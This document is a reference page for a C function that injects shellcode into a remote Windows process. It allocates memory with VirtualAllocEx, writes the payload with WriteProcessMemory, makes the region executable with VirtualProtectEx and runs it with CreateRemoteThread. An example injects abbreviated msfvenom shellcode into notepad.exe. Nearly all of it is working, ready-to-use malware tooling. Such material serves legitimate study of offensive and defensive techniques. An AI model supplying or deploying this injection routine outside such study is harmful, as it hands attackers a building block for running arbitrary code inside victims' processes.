## Remote Payload Injection via CreateRemoteThread

Injects a shellcode buffer into a remote process by allocating a `RW` region with `VirtualAllocEx`, writing the payload with `WriteProcessMemory`, flipping the protection to `RWX` with `VirtualProtectEx`, and launching execution in a new thread via `CreateRemoteThread`. The local shellcode buffer is zeroed out after the write since it is no longer needed.

**Usage**

Call `InjectShellcodeToRemoteProcess` with an open handle to the target process, the plaintext shellcode buffer, and its size. The shellcode must be fully deobfuscated before the call — it cannot be edited once it resides in the remote process.

- `IN HANDLE hProcess` Open handle to the target remote process.
- `IN PBYTE pShellcode` Base address of the plaintext shellcode buffer to inject.
- `IN SIZE_T sSizeOfShellcode` Size of `pShellcode` in bytes.

**Return Value**

`BOOL` Returns `TRUE` if the shellcode was successfully allocated, written, and executed in the remote process, otherwise `FALSE`.

**External Files**

- `windows.h` `HANDLE`, `PBYTE`, `PVOID`, `SIZE_T`, `DWORD`, `IN`, `VirtualAllocEx()`, `WriteProcessMemory()`, `VirtualProtectEx()`, `CreateRemoteThread()`, `GetLastError()`
- `string.h` `memset()`
- `stdio.h` `printf()`, `getchar()`


### Code

```c
#include <windows.h>
#include <string.h>
#include <stdio.h>


BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) {

    PVOID   pShellcodeAddress       = NULL;
    SIZE_T  sNumberOfBytesWritten   = NULL;
    DWORD   dwOldProtection         = NULL;

    // Allocate RW memory in the remote process to hold the shellcode.
    pShellcodeAddress = VirtualAllocEx(
        hProcess,               // Handle to the target remote process.
        NULL,                   // Let the OS choose the base address.
        sSizeOfShellcode,       // Size of the allocation in bytes.
        MEM_COMMIT | MEM_RESERVE, // Reserve and commit pages in one call.
        PAGE_READWRITE          // RW only at allocation time; execute is added later.
    );
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    // Write the shellcode into the allocated region of the remote process.
    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

    // Zero out the local shellcode buffer — it is no longer needed
    // after the payload has been written to the remote process.
    memset(pShellcode, '\0', sSizeOfShellcode);

    // Flip the remote memory protection from RW to RWX so the shellcode can execute.
    if (!VirtualProtectEx(
        hProcess,               // Handle to the target remote process.
        pShellcodeAddress,      // Base address of the region to modify.
        sSizeOfShellcode,       // Size of the region in bytes.
        PAGE_EXECUTE_READWRITE, // New protection: read, write, and execute.
        &dwOldProtection        // Receives the previous protection value.
    )) {
        printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();
    printf("[i] Executing Payload ... ");

    // Launch the shellcode in a new thread inside the remote process.
    if (CreateRemoteThread(
        hProcess,           // Handle to the target remote process.
        NULL,               // Default security attributes.
        NULL,               // Default stack size.
        pShellcodeAddress,  // Thread start address: base of the shellcode buffer.
        NULL,               // No parameter passed to the thread function.
        NULL,               // Run immediately.
        NULL                // Thread ID not required.
    ) == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[+] DONE !\n");

    return TRUE;
}
```

**Example**

```c
DWORD  dwProcessId = 0;
HANDLE  hProcess    = NULL;

// Open the target process — must include PROCESS_VM_OPERATION + PROCESS_CREATE_THREAD.
GetRemoteProcessHandle(L"notepad.exe", &dwProcessId, &hProcess);

// msfvenom calc shellcode, abbreviated for the snippet.
unsigned char pPayload[]   = { 0xFC, 0x48, 0x83, 0xE4, 0xF0 /* ... */ };
SIZE_T        sPayloadSize = sizeof(pPayload);

// Allocate, write, protect, and spawn a remote thread at the payload.
InjectShellcodeToRemoteProcess(hProcess, pPayload, sPayloadSize);

CloseHandle(hProcess);
```
